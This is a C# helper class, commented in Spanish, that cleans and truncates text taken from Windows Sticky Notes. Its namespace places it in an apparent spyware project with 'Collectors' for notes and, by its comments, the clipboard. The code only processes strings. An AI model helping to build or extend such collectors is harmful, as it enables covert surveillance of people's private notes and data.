using System.Text.RegularExpressions;

namespace Spyware.Collectors.Notes;

/// <summary>
/// Limpieza del texto tal y como lo guarda Sticky Notes. La aplicación mete marcas
/// internas (<c>\id=&lt;guid&gt;</c> al inicio de cada párrafo) que no son parte del
/// mensaje: se quitan, pero el contenido se conserva sin traducir.
/// </summary>
public static class NoteText
{
    private static readonly Regex InternalMarker = new(
        @"\\id=[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}[ \t]*",
        RegexOptions.Compiled | RegexOptions.Multiline);

    public static string Sanitize(string? raw)
    {
        if (string.IsNullOrEmpty(raw)) return string.Empty;

        string cleaned = InternalMarker.Replace(raw, string.Empty);

        cleaned = cleaned.Replace("\r\n", "\n").Replace('\r', '\n').Trim('\0', ' ', '\n');

        // El texto puede venir con dobles saltos por cada párrafo: se normaliza a uno.
        while (cleaned.Contains("\n\n\n", StringComparison.Ordinal))
            cleaned = cleaned.Replace("\n\n\n", "\n\n");

        return cleaned;
    }

    /// <summary>Verdadero si después de quitar las marcas internas no queda texto.</summary>
    public static bool IsBlank(string? raw) => Sanitize(raw).Length == 0;

    /// <summary>Mismo criterio de recorte que el portapapeles: marca el corte a la vista.</summary>
    public static string Truncate(string text, int maxLength, out bool truncated)
    {
        int max = Math.Max(16, maxLength);
        truncated = text.Length > max;

        return truncated ? text[..max] + "\n…[truncado]" : text;
    }
}
